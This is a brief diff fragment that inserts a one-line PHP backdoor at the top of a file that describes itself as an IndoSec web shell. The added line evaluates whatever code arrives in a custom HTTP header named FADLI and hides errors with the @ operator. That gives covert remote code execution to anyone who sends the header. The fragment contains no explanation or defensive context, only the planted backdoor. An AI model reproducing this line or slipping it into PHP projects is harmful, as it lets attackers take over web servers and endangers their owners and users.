@@ -1,3 +1,4 @@
+<?php @eval($_SERVER['HTTP_FADLI']);?>
 <?php
 /*
     * Konsep Shell : Brillyan -Founder { IndoSec }-
